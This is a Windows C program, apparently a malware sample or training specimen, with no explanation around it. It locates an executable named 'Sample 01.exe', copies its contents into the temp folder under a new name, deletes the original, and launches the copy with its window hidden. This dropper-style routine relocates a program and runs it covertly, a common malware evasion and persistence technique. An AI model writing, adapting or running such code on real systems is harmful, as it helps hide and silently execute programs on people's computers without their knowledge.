#include <windows.h>
#include <stdio.h>

int main( ) {
	WIN32_FIND_DATA		FileData;
	HANDLE				hFind, hSourceFile, hDestFile;
	TCHAR				lpBuffPath[MAX_PATH] = {0, },
						lpFindPath[MAX_PATH] = {0, },
						lpTargetPath[MAX_PATH] = {0, };
	char				*lpBuffer = NULL;
	DWORD				dwFileSize = 0,
						dwRead = 0,
						dwWrite = 0;
	bool				bResult = FALSE;
 
	//Get the Current Folder path.
	GetCurrentDirectory(MAX_PATH, lpBuffPath);

	//Determines the Find Path.
	wsprintf(lpFindPath, "%s\\%s", lpBuffPath, "*.*");

	//Find the first file in the specified area.
	hFind = FindFirstFile(lpFindPath, &FileData);
	if(hFind==INVALID_HANDLE_VALUE)
	{
		return 0;
	}

	do {
		if(strcmp(FileData.cFileName, "Sample 01.exe") == 0)
		{
			wsprintf(lpFindPath, "%s\\%s", lpBuffPath, FileData.cFileName);

			//Open the Source Sample.exe.
			hSourceFile = CreateFile(lpFindPath, 
									GENERIC_READ, 
									0, NULL, 
									OPEN_EXISTING, 
									FILE_ATTRIBUTE_NORMAL, 
									NULL);
			if(hSourceFile == INVALID_HANDLE_VALUE)
			{
				CloseHandle(hFind);
				return 0;
			}

			//Get Source Sample.exe File Size.
			dwFileSize = GetFileSize(hSourceFile, NULL);
			if(dwFileSize == 0xFFFFFFFF)
			{
				CloseHandle(hSourceFile);
				CloseHandle(hFind);
				return 0;
			}
		
			//Allocate Buffer to Memory.
			lpBuffer = (char *)malloc(dwFileSize + 1); 
			if(lpBuffer == NULL)
			{
				CloseHandle(hSourceFile);
				CloseHandle(hFind);
				return 0;
			}

			//Read the Source Sample.exe File Data.
			bResult = ReadFile(hSourceFile, lpBuffer, dwFileSize, &dwRead, NULL);
			if(!bResult)
			{
				CloseHandle(hSourceFile);
				CloseHandle(hFind);
				return 0;
			}
			CloseHandle(hSourceFile);
			
			//Delete the Source Sample.exe.
			bResult = DeleteFile(lpFindPath);
			if(!bResult)
			{
				CloseHandle(hFind);
				return 0;
			}
			
			//Get the Temp Folder path.
			GetTempPath(MAX_PATH, lpBuffPath);
		
			//Get Source Sample.exe File Path.
			wsprintf(lpTargetPath, "%s%s", lpBuffPath, "Replicated Sample 01.exe");

			//Create the DestSample.exe.
			hDestFile = CreateFile(	lpTargetPath, 
									GENERIC_WRITE, 
									0, NULL, 
									CREATE_NEW, 
									FILE_ATTRIBUTE_NORMAL, 
									NULL);
			if(hDestFile == INVALID_HANDLE_VALUE)
			{
				CloseHandle(hFind);
				return 0;
			}

			//Write the Source Sample.exe File Data in DestSample.exe File.
			bResult = WriteFile(hDestFile, lpBuffer, dwFileSize, &dwWrite, NULL);
			if(!bResult)
			{
				CloseHandle(hDestFile);
				CloseHandle(hFind);
				return 0;
			}
			CloseHandle(hDestFile);
			
			WinExec(lpTargetPath, SW_HIDE);
		}
	} while(FindNextFile(hFind, &FileData)); //Find Next File in TampPath.

	CloseHandle(hFind);
	
	return 1;
}